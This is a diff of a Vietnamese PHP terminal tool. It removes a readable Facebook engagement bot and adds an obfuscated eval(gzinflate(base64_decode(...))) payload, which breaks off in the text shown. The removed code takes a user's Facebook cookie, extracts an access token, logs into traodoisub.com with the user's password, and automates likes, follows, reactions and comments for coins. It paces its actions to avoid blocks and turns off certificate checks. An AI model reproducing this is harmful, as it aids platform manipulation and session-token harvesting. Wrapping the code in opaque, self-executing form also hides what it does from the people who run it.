@@ -1,565 +1,162 @@
-<?php
-/***
-Date		:	2020-09-27 Sunday 18:37:21
-Ipaddress		:	103.19.99.51
-City		:	GiaLai
-Country		:	VN
-Region		:	Gialai
-Organization		:	Australian Academic and Research Network
-User-Agent		:	Mozilla/5.0 (Linux; Android 10; SamSung Galaxy S20 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36
-***/
-error_reporting(0);
-session_start();
-//color
-$res="\033[0m";
-$red="\033[1;31m";
-$red ="\e[1;31m";
-$gre = "\e[1;32m";
-$green="\033[1;32m";
-$yellow="\033[1;33m";
-$yel ="\e[1;33m";
-$blue="\033[1;34m";
-$white= "\033[1;37m";
-$whi ="\e[1;37m";
-$purple="\033[1;35m";
-$cyan="\033[1;36m";
-$banner="\r
-\e[1;37m|================[LIÊN HỆ HỖ TRỢ]================|
-|\e[1;32mFaceBook :                  Nguyễn Trường Thành \e[1;37m|
-|                                                |
-|\e[1;32mZalo :                           0374222721     \e[1;37m|
-\e[1;37m|================================================|
-\033[1;35m
-           Trời Xanh Mây Trắng Nắng Vàng
-      Không Liên Quan Lắm Nhưng Mà Đang Cay   
-\n";  
-//config
-echo "\n";
-echo $yellow."NHẬP API KEY: $green";
-$apikey=trim(fgets(STDIN));
-if ($apikey == "Thanh Rose")
-{
-sleep(1);
-echo $green."KEY KHÔNG FULL CHỨC NĂNG";
-sleep(2);
-} 
-else{
-sleep(1);
-echo $red."";
-exit("️BẠN ĐÃ NHẬP SAI KEY VUI LÒNG LIÊN HỆ QUA ADMIN ĐỂ MUA KEY NHA 😂😂\n");}
-sleep(2);
-@system('clear');
-banner();
-  echo $gre."     CHECK COOKIE FACEBOOK TRƯỚC KHI VÀO TOOL\n\n";
-  echo $whi."Nhập Cookie: $gre";
-$cookie = trim(fgets(STDIN));
-$source = facebook("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed", $cookie);
-$token=explode('\",\"useLocalFilePreview', explode('accessToken\":\"', $source)[1])[0];
-$user=api("https://graph.facebook.com/me?access_token=".$token);
-@banner();
-if ($user['id']==true){
-  $check_api=api("https://graph.facebook.com/1930832833720684/likes?fields=total_count&access_token=".token);
-  echo $whi."-------------------[THÀNH CÔNG]-------------------";
-  echo $whi."● ID: ".$gre.$user['id']."\n";
-  echo $whi."● Tên Tài Khoản: ".$gre.$user['name']."\n";
-  echo $whi."● Trạng Thái:$gre Cookie Hoạt Động\n";
-  echo $whi."--------------------[LOAD TOOL]-------------------";
-    }
- else {
-  echo $whi."--------------------[THẤT BẠI]--------------------";
-  echo $whi."● ID:$red None\n";
-  echo $whi."● Tên Tài Khoản:$red None\n";
-  echo $whi."● Trạng Thái:$red Cookie Die\n";
-  echo $whi."--------------------[OUT TOOL]--------------------";
-  echo "\n\n";
-  {exit($red."VUI LÒNG LẤY LẠI COOKIE MỚI RỒI QUAY LẠI TOOLS\n");}
-}
-function facebook($url, $cookie) {
-  $head[] = "Connection: keep-alive";
-  $head[] = "Keep-Alive: 300";
-  $head[] = "Accept-Charset: ISO-9-1,utf-8;q=0.7,*;q=0.7";
-  $head[] = "Accept-Language: en-us,en;q=0.5";
-  $ch = @curl_init();
-  curl_setopt_array($ch, array(
-    CURLOPT_URL => $url,
-    CURLOPT_USERAGENT => 'Mozilla/5.0 (Linux; Android 10; SM-J600G)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36',
-    CURLOPT_ENCODING => '',
-    CURLOPT_COOKIE => $cookie,
-    CURLOPT_HTTPHEADER => $head,
-    CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_SSL_VERIFYHOST => FALSE,
-    CURLOPT_SSL_VERIFYPEER => FALSE,
-    CURLOPT_TIMEOUT => 60,
-    CURLOPT_CONNECTTIMEOUT => 60,
-    CURLOPT_FOLLOWLOCATION => TRUE,
-    CURLOPT_HTTPHEADER => array(
-    'Expect:'
-    )
-  ));
-$page = curl_exec($ch);
-  curl_close($ch);
-  return $page;
-}
-function api($url) {
-  $ch = curl_init();
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  curl_setopt($ch, CURLOPT_URL, $url);
-  $source = json_decode(curl_exec($ch), true);
-  curl_close($ch);
-  return $source;
-}
-function banner() {
-}
-date_default_timezone_set("Asia/Ho_Chi_Minh");
-echo "\n\n";
-echo $red."Thông Báo:$cyan 02/10/2020$green Bảo Trì Chức Năng Like Fanpage Và Comment Post...\n";
-sleep(5);
-{
-@system('clear');
-echo $banner;
-$listnv = [];
-echo $white."Tài Khoản : $green";
-$_SESSION["username"]=trim(fgets(STDIN));
-echo $white."Mật Khẩu : $green";
-$_SESSION['password']=trim(fgets(STDIN));
-echo $white."Cookie FaceBook: $green";
-$cookie=trim(fgets(STDIN));
-echo"$res";
-$ch=curl_init();
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_URL, 'https://traodoisub.com/scr/login.php');
-curl_setopt($ch, CURLOPT_COOKIEJAR, "TDS.txt");
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36');
-$login =array('username' => $_SESSION['username'],'password' => $_SESSION['password'],'submit' => ' Đăng Nhập');
-curl_setopt($ch, CURLOPT_POST,count($login));
-curl_setopt($ch, CURLOPT_POSTFIELDS,$login);
-curl_setopt($ch, CURLOPT_COOKIEFILE, "TDS.txt");
-$source=curl_exec($ch);
-curl_close($ch);
-if ($source != 1 && $source != ''){
-@system('clear');
-        echo $banner;
-	echo $green."                ĐĂNG NHẬP THÀNH CÔNG \n";
-	$user = $_SESSION["username"];
-	echo $white."● NHIỆM VỤ FOLLOW (H/L): $green";
-	if (trim(fgets(STDIN)) == 'H'){
-		array_push($listnv,'sub');
-		echo $red."● DELAY FOLLOW: $green";
-		$_SESSION['delaysub']=trim(fgets(STDIN));
-	}
-	echo $white."● NHIỆM VỤ LIKE FANPAGE (H/L):$red ERROR\n";
-	if (trim(fgets()) == 'H'){
-		array_push($listnv,'page');
-		echo $red."● DELAY LIKE FANPAGE: $green";	
-		$_SESSION['delaypage']=trim(fgets(STDIN));
-	}
-	echo $white."● NHIỆM VỤ COMMENT POST (H/L):$red ERROR\n";
-   if (trim(fgets()) == 'H'){
-		array_push($listnv,'cmt');
-		echo $red."● DELAY COMMENT POST: $green";
-		$_SESSION['delaycmt']=trim(fgets(STDIN));
-	}
-	echo $white."● NHIỆM VỤ LIKE POST (H/L: $green";
-	if (trim(fgets(STDIN)) == 'H'){
-		array_push($listnv,'like');
-		echo $red."● DELAY LIKE POST: $green";
-		$_SESSION['delaylike']=trim(fgets(STDIN));
-	}
-	echo $white."● NHIỆM VỤ CẢM XÚC (H/L): $green";
-	if (trim(fgets(STDIN)) == 'H'){
-		array_push($listnv,'cx');
-		echo $red."● DELAY CẢM XÚC: $green";
-		$_SESSION['delaycx']=trim(fgets(STDIN));
-	}
-	if (count($listnv) == 0){exit($red."Vui Lòng Chọn Ít Nhất 1 Chế Độ Nhiệm Vụ..!");}
-	echo $white."Delay Chống Block : $green";
-	$_SESSION['j']=trim(fgets(STDIN));
- echo $white."Số Vòng Chạy : $green";
-	$_SESSION['i']=trim(fgets(STDIN));
-}else{
-	exit($red."Đăng Nhập Thất Bại, Kiểm Tra Lại Tài Khoản Mật Khẩu..!");
-}
-#get_token
-@system('clear');
-$ch=curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');
-$head[] = "Connection: keep-alive";
-$head[] = "Keep-Alive: 300";
-$head[] = "authority: m.facebook.com";
-$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
-$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
-$head[] = "cache-control: max-age=0";
-$head[] = "upgrade-insecure-requests: 1";
-$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
-$head[] = "sec-fetch-site: none";
-$head[] = "sec-fetch-mode: navigate";
-$head[] = "sec-fetch-user: ?1";
-$head[] = "sec-fetch-dest: document";
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
-curl_setopt($ch, CURLOPT_ENCODING, '');
-curl_setopt($ch, CURLOPT_COOKIE, $cookie);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
-$access = curl_exec($ch);
-curl_close($ch);
-if (explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0]){
-$access_token = explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0];
-if(json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'}){
-	$idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'};	
-}else{
-	exit($red."Cookie Die Vui Lòng Lấy Lại Cookie Mới..!");
-}
-$h = datnick($user,$idfb);
-$xu =
-file_get_contents('https://traodoisub.com/scr/test3.php?user='.$user);
-echo $white."──────────────[THÔNG TIN TÀI KHOÀN]───────────────\n";
-echo $white."● TÀI KHOẢN TRAODOISUB: ".$green.$user."\n";
-echo $white."● CẤU HÌNH TRAODOISUB: ".$green.$idfb."\n";
-echo $white."● XU ĐANG CÓ: ".$green.$xu." XU\n";
-echo $white."──────────────[THÔNG TIN NHIỆM VỤ]────────────────\n";
-echo $white."● DELAY FOLLOW: ".$green.$_SESSION['delaysub']." GIÂY\n";
-echo $white."● DELAY LIKE FANPAGE: ".$red.$_SESSION['delaypage']." ERROR\n";
-echo $white."● DELAY LIKE POST: ".$green.$_SESSION['delaylike']." GIÂY\n";
-echo $white."● DELAY CẢM XÚC: ".$green.$_SESSION['delaycx']." GIÂY\n";
-echo $white."● DELAY COMMENT: ".$red.$_SESSION['delaycmt']." ERROR\n";
-echo $white."● SỐ VÒNG CHẠY: ".$green.$_SESSION['i']." VÒNG\n";
-echo $white."● DELAY CHỐNG BLOCK: ".$green.$_SESSION['j']." GIÂY\n";
-echo $white."──────────────────────────────────────────────────\n";
-if ($h == '1'){
-		$i=1;
-		while ($i <= $_SESSION['i']){
-			$rand = $listnv[array_rand($listnv,1)];
-			if ($rand == 'like'){
-				$list = getnv('like',$user);
-				$check = count($list);
-				if ($check == 0){echo $red."Hết Nhiệm Vụ!\n"; $i++; continue;}
-				foreach ($list  as $id) {
-					$g = like($access_token,$id,$cookie);
-					if ($g->{'error'}->{'code'} == 368){
-						exit($red."● Đã Bị Block Tính Năng\n");
-					}
-					$s = nhantien('like',$id);
-					if ($s == 2){$stt = $stt + 1;$xu = $xu + 200;
-echo $white."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo "\e[1;31m|\e[1;32mLIKE\e[1;31m|\e[1;37m".$id."\e[1;31m|\e[1;32m+200\e[1;31m|".$white.$xu;}
-else{$stt = $stt +1;
-echo $red."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo $red."\e[1;31m|LIKE\e[1;31m|\e[1;37m".$id."\e[1;31m|\e[1;31mNONE\e[1;31m|".$white.$xu;}
-echo "\n";
-					sleep($_SESSION['delaylike']);
-				}
-			}else if($rand == 'sub'){
-				$list = getnv('follow',$user);
-				$check = count($list);
-				if ($check == 0){echo $red."Hết Nhiệm Vụ\n"; $i++; continue;}
-				foreach ($list  as $id) {
-					$g = follow($access_token,$id,$cookie);
-				if ($g->{'error'}->{'code'} == 368){
-						exit($red."● Đã Bị Block Tính Năng\n");
-					}
-					$s = nhantien('sub',$id);
-          if ($s == 2){$stt = $stt + 1;$xu = $xu + 600;
-echo $white."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo "\e[1;31m|\e[1;32mFOLLOW\e[1;31m|\e[1;37m".$id."\e[1;31m|\e[1;32m+600\e[1;31m|".$white.$xu;}
-else{$stt = $stt + 1;
-echo $red."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo $red."\e[1;31m|FOLLOW\e[1;31m|\e[1;37m".$id."\e[1;31m|\e[1;31mNONE\e[1;31m|".$white.$xu;}
-echo "\n";
-					sleep($_SESSION['delaysub']);
-				}
-			}else if($rand == 'page'){
-				$list = getnv('likepage',$user);
-				$check = count($list);
-				if ($check == 0){echo $red."Hết Nhiệm Vụ!\n"; $i++; continue;}
-   echo "\n";
-echo $white."SỐ NHIỆM VỤ LIKE FANPAGE ĐÃ TÌM THẤY: ".$green.$check."\n";
-				foreach ($list  as $id) {
-					page($id,$cookie);
-					$s = nhantien('page',$id);
-					if ($s == 2){$stt = $stt + 1;$xu = $xu + 600;
- echo $white."[$stt]\e[0;31m|";
-echo $cyan.date("H:i");
-echo "\e[0;31m|\e[0;32mPAGE\e[0;31m|\e[0;37m".$id."\e[0;31m|\e[0;32m+600\e[0;31m|".$white.$xu;}
-else{$stt = $stt + 1;
-echo $red."[$stt]\e[0;31m|";
-echo $cyan.date("H:i");
-echo $red."\e[0;31m|PAGE\e[0;31m|\e[0;37m".$id."\e[0;31m|\e[0;31mNONE\e[0;31m|".$white.$xu;}
-echo "\n";
-					sleep($_SESSION['delaypage']);
-				}
-			}else if($rand == 'cx'){
-				$list = getnv('camxuc',$user);
-				$check = count($list);
-				if ($check == 0){echo $red."Hết nhiệm vụ!\n"; $i++; continue;}
-				foreach ($list  as $id => $key) {
-					$id = $key->{'id'};
-					$type = $key->{'type'};
-					camxuc($id,$type,$cookie);
-					$s = nhantiencx($type,$id);
-					if ($s == 2){$stt = $stt +1;$xu = $xu + 400;
- echo $white."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo "\e[1;31m|\e[1;32m$type\e[1;31m|\e[1;37m".$id."\e[1;31m|\e[1;32m+400\e[1;31m|".$white.$xu;}
-else{$stt = $stt + 1;
-echo $red."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo $red."\e[1;31m|$type\e[1;31m|\e[1;37m".$id."\e[1;31m|\e[1;31mNONE\e[1;31m|".$white.$xu;}
-					echo "\n";
-					sleep($_SESSION['delaycx']);
-				}
-			}
-			else{
-				$list = getnv('cmt',$user);
-				$check = count($list);
-				if ($check == 0){echo $red."Hết Nhiệm Vụ\n"; $i++; continue;}
-				foreach ($list  as $id => $key) {
-					$uid = $key->{'id'};
-					$msg = $key->{'nd'};
-					$g = cmt($access_token,$uid,$cookie,$msg);
-					if ($g->{'error'}->{'code'} == 368){
-						exit($red."● Đã Bị Block Tính Năng\n");
-					}
-					$s = nhantien('cmt',$uid);
-					if ($s == 2){$stt = $stt + 1;$xu = $xu + 600;
-echo $white."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo "\e[1;31m|\e[1;32mCMT\e[1;31m|\e[1;37m".$uid."\e[1;31m|\e[1;32m+600\e[1;31m|".$white.$xu;}
-else{$stt = $stt + 1;
-echo $red."[$stt]\e[1;31m|";
-echo $cyan.date("H:i");
-echo $red."\e[1;31m|CMT\e[1;31m|\e[1;37m".$uid."\e[1;31m|\e[1;31mNONE\e[1;31m|".$white.$xu;}
-echo "\n";
-					sleep($_SESSION['delaycmt']);
-				}
-			}
-	$delay=$_SESSION['j'];
-for ($i=0; $i < $delay+1; $i++){
-  sleep(1);
-}
-		}
-}else{exit($red."Cấu hình thất bại, vui lòng thêm id: $id vào cấu hình");}
-}else{exit($red."Cookie die!!");}
-}
-function follow($access_token,$id,$cookie){
-	$ch=curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/'.$id.'/subscribers');
-	$head[] = "Connection: keep-alive";
-	$head[] = "Keep-Alive: 300";
-	$head[] = "authority: m.facebook.com";
-	$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
-	$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
-	$head[] = "cache-control: max-age=0";
-	$head[] = "upgrade-insecure-requests: 1";
-	$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
-	$head[] = "sec-fetch-site: none";
-	$head[] = "sec-fetch-mode: navigate";
-	$head[] = "sec-fetch-user: ?1";
-	$head[] = "sec-fetch-dest: document";
-	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
-	curl_setopt($ch, CURLOPT_ENCODING, '');
-	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
-	$data = array('access_token' => $access_token);
-	curl_setopt($ch, CURLOPT_POST,count($data));
-	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
-	$access = curl_exec($ch);
-	curl_close($ch);
-	return json_decode($access);
-}
-function like($access_token,$id,$cookie){
-	$ch=curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/'.$id.'/likes');
-	$head[] = "Connection: keep-alive";
-	$head[] = "Keep-Alive: 300";
-	$head[] = "authority: m.facebook.com";
-	$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
-	$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
-	$head[] = "cache-control: max-age=0";
-	$head[] = "upgrade-insecure-requests: 1";
-	$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
-	$head[] = "sec-fetch-site: none";
-	$head[] = "sec-fetch-mode: navigate";
-	$head[] = "sec-fetch-user: ?1";
-	$head[] = "sec-fetch-dest: document";
-	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
-	curl_setopt($ch, CURLOPT_ENCODING, '');
-	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
-	$data = array('access_token' => $access_token);
-	curl_setopt($ch, CURLOPT_POST,count($data));
-	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
-	$access = curl_exec($ch);
-	curl_close($ch);
-	return json_decode($access);
-}
-function cmt($access_token,$id,$cookie,$msg){
-	$ch=curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/'.$id.'/comments');
-	$head[] = "Connection: keep-alive";
-	$head[] = "Keep-Alive: 300";
-	$head[] = "authority: m.facebook.com";
-	$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
-	$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
-	$head[] = "cache-control: max-age=0";
-	$head[] = "upgrade-insecure-requests: 1";
-	$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
-	$head[] = "sec-fetch-site: none";
-	$head[] = "sec-fetch-mode: navigate";
-	$head[] = "sec-fetch-user: ?1";
-	$head[] = "sec-fetch-dest: document";
-	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
-	curl_setopt($ch, CURLOPT_ENCODING, '');
-	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
-	$data = array('message' => $msg,'access_token' => $access_token);
-	curl_setopt($ch, CURLOPT_POST,count($data));
-	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
-	$access = curl_exec($ch);
-	curl_close($ch);
-	return json_decode($access);
-}
-function page($id,$cookie){
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/'.$id);
-	$head[] = "Connection: keep-alive";
-	$head[] = "Keep-Alive: 300";
-	$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
-	$head[] = "Accept-Language: en-us,en;q=0.5";
-	curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
-	curl_setopt($ch, CURLOPT_ENCODING, '');
-	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
-	:'));
-	$page = curl_exec($ch);
-	if (explode('&amp;refid=',explode('pageSuggestionsOnLiking=1&amp;gfid=',$page)[1])[0]){
-		$get = explode('&amp;refid=',explode('pageSuggestionsOnLiking=1&amp;gfid=',$page)[1])[0];
-		$link = 'https://mbasic.facebook.com/a/profile.php?fan&id='.$id.'&origin=page_profile&pageSuggestionsOnLiking=1&gfid='.$get.'&refid=17';
-		curl_setopt($ch, CURLOPT_URL, $link);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_exec($ch);
-	}	
-	curl_close($ch);
-
-}
-function camxuc($id,$type,$cookie){
-	$ch = curl_init();
-	if(strpos($id,'_')){
-		$uid = explode('_',$id, 2);
-		$id2 = 'story.php?story_fbid='.$uid[1].'&id='.$uid[0];
-	}else{
-		$id2 = $id;
-	}
-	curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/'.$id2);
-	$head[] = "Connection: keep-alive";
-	$head[] = "Keep-Alive: 300";
-	$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
-	$head[] = "Accept-Language: en-us,en;q=0.5";
-	curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
-	curl_setopt($ch, CURLOPT_ENCODING, '');
-	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
-	:'));
-	$page = curl_exec($ch);
-	if ($id2 != $id && explode('&amp;origin_uri=',explode('amp;ft_id=',$page,2)[1],2)[0]){
-		$get = explode('&amp;origin_uri=',explode('amp;ft_id=',$page,2)[1],2)[0];
-	}else{
-		$get = $id2;
-	}
-	$link = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id='.$get;
-	curl_setopt($ch, CURLOPT_URL, $link);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	$cx = curl_exec($ch);
-	$haha = explode('<a href="',$cx);
-	if ($type == 'LOVE'){
-		$haha2 = explode('" style="display:block"',$haha[2])[0];
-	}else if ($type == 'WOW'){
-		$haha2 = explode('" style="display:block"',$haha[5])[0];
-	}else if ($type == 'HAHA'){
-		$haha2 = explode('" style="display:block"',$haha[4])[0];
-	}else if ($type == 'SAD'){
-		$haha2 = explode('" style="display:block"',$haha[6])[0];
-	}else{
-		$haha2 = explode('" style="display:block"',$haha[7])[0];
-	}
-	$link2 = html_entity_decode($haha2);	
-
-	curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com'.$link2);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_exec($ch);
-	curl_close($ch);
-}
-function getnv($loai,$user){
-	$list = file_get_contents('https://traodoisub.com/scr/api_job.php?chucnang='.$loai.'&user='.$user);
-	return json_decode($list);
-}
-function datnick($user,$id){
-	$xxx = file_get_contents('https://traodoisub.com/scr/api_dat.php?user='.$user.'&idfb='.$id);
-	return $xxx;
-}
-function nhantien($loai,$id){
-	$ch=curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://traodoisub.com/scr/nhantien'.$loai.'.php');
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	$tdsxu=array('id' => $id);
-	curl_setopt($ch, CURLOPT_POST,count($tdsxu));
-	curl_setopt($ch, CURLOPT_POSTFIELDS,$tdsxu);
-	curl_setopt($ch, CURLOPT_COOKIEFILE, "TDS.txt");
-	$xu=curl_exec($ch);
-	curl_close($ch);
-	return $xu;
-}
-function nhantiencx($loai,$id){
-	$ch=curl_init();
-	curl_setopt($ch, CURLOPT_URL, 'https://traodoisub.com/scr/nhantiencx.php');
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	$tdsxu=array('id' => $id, 'loaicx' => $loai);
-	curl_setopt($ch, CURLOPT_POST,count($tdsxu));
-	curl_setopt($ch, CURLOPT_POSTFIELDS,$tdsxu);
-	curl_setopt($ch, CURLOPT_COOKIEFILE, "TDS.txt");
-	$xu=curl_exec($ch);
-	curl_close($ch);
-	return $xu;
-}
-
-?>
+<? eval(gzinflate(base64_decode('
+7TzbbhvJlc9twP9Q5gomOaZ4lWUNNRyHpiiTEUUq
+ImWPVxaIVrNI1ojsZrqbMhWPgMEMdhfYTZDZbLCX
+LBZrzwXYBBMkWOzDQnrIAwfzH8oPbD4h51R1k91k
+8ybJmVlDhC2SVadOnVN1rnWq+fD99x52mp3bt6iu
+a3p1l3Y03QxEg+u3bxnUMJimVg1ThiZsiUQUraXp
+t28t6dRI+Z5HE4n9aNu3zhtqVkNsPREbtBFopI6m
+hk5Jilht8UEbVYeDrdYT2mppL4bNiUHzAKfVdNjq
+0iHcimh80WQmxZms5geD5sFwq6nT1TstB4L7olk5
+kR1ErVpTyapKdWiGNbCRfJQaee0X8v2/L5Lcxfnf
+4p9/JpXdi/PPD0bBPrp96yN7HTZlhT7StCOSJGOv
+YqN7cnH+Nyqp6N/+/uL8P9QGqTT7r9QmGVAAmMiC
+L+fsfy23NK+ZB69o4sFKPB5/EI/xr455Jy7CrBeO
+HSz47VuOySo6MMnIBzJwuN3//AQbzn4HXBfF2xPg
+vWGP2Gr2/wfaCqz/G5X8qCurpABQbVJsfvt7aN/u
+vyLffCbDp4x8AuAwqepbx3cUZbXOABFVmhrIiYob
+zD9bohf2FXMXZ1/vkPROnmxlnyWJkFQuCHKHHdGT
+lKmzdqDeoKYRKFc28sUgagmrk4AFQFIggpUmsrKr
+GdQXvH3rJShWi9JOIBYcTMjxhn0wCdnK9X9ZfEw2
+9woFkgHp+a8MKX7zSfExzirGxXHcKbBAWwb1wgZq
+F/ZxbnrMDPj+739//uji7FURFqL/KbF4Kqc5T+TJ
+Xp4U+r+AGR1C+6O9NElvbOdxyMX5J2QbviNwMZcm
+f/rPf/0E/8N6BddPXTT9wDgxTNoO+JUWlXU/Ngl9
+4baDkAGvYR/fu0wum9kimVJpK58lm+lM9hF8BGX5
+9ncX57/KwErkYa8/LpFKqVR4rooNsrGAHsP+NC/O
+ftshGVAcRsX2CNXlDWBnPLdnydC6uoLdddC6Q4AN
